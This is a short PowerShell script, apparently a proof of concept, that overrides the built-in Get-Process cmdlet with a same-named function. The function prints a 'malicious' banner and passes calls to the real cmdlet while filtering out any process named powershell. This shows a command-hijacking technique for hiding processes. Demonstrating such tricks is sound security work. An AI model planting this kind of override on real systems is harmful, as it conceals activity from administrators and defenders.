function Get-Process {
	param(
		$Name,
		$Id,
		$InputObject,
		$IncludeUserName,
		$ComputerName,
		$Module,
		$FileVersionInfo
	)
	Write-Host -ForegroundColor "Red" -Object "Hello from malicious Get-Process!"
	$Function = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Management\Get-Process', [System.Management.Automation.CommandTypes]::Cmdlet)
	& $Function @PSBoundParameters | Where-Object {$_.ProcessName -notmatch 'powershell'}
}
